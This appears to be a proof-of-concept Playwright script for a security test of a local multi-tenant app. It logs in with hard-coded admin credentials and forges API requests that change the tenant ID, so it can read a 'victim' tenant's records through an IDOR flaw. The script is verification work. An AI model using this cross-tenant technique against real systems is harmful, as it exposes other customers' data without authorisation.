const { chromium } = require('playwright');
const LEGACY = 'http://localhost:8080';

async function login(page) {
  await page.goto(`${LEGACY}/index.html`, { waitUntil: 'load', timeout: 30000 });
  await page.waitForTimeout(1500);
  await page.fill('#userName', 'admin');
  await page.fill('#password', '12345');
  await page.locator('#password').blur();
  await page.waitForFunction(() => document.querySelectorAll('#organizationId option').length > 1, { timeout: 10000 });
  await page.selectOption('#organizationId', '1');
  await page.waitForFunction(() => document.querySelectorAll('#unitId option').length > 1, { timeout: 10000 });
  const unitVal = await page.$eval('#unitId option:nth-child(2)', (o) => o.value);
  await page.selectOption('#unitId', unitVal);
  await page.click('input[type="submit"]');
  await page.waitForTimeout(1500);
  const confirmOk = page.locator('button:has-text("Ok")').first();
  if (await confirmOk.isVisible().catch(() => false)) await confirmOk.click();
  await page.waitForFunction(() => !!window.sessionStorage.getItem('token'), { timeout: 15000 });
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();
  await login(page);
  const token = await page.evaluate(() => window.sessionStorage.getItem('token'));
  console.error('Logged in as real org1/unit1 admin, token acquired.');

  // Forged request: this real, legitimate org1/unit1 session asks for ORG 999's
  // (victim tenant) route-of-administration list, by simply changing the orgId
  // path segment -- exactly the BR-121-138 attack shape from earlier tonight.
  const listResp = await page.evaluate(async (tok) => {
    const res = await fetch('/api/global/route/of/administration/999', {
      headers: { 'Authorization': 'Bearer ' + tok }
    });
    const body = await res.text();
    return { status: res.status, body };
  }, token);
  console.error('GET /api/global/route/of/administration/999 (forged orgId, real org1 session):');
  console.error(JSON.stringify(listResp, null, 1));

  // getById: fetch victim record (id=1, seeded under org 999) via the org1-scoped
  // path -- the DAO's getById() ignores orgId entirely, so even the "correct"
  // org1 path should still leak it if the finding is real.
  const byIdResp = await page.evaluate(async (tok) => {
    const res = await fetch('/api/global/route/of/administration/1/1', {
      headers: { 'Authorization': 'Bearer ' + tok }
    });
    const body = await res.text();
    return { status: res.status, body };
  }, token);
  console.error('GET /api/global/route/of/administration/1/1 (org1 path, but id=1 belongs to victim org 999):');
  console.error(JSON.stringify(byIdResp, null, 1));

  await browser.close();
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
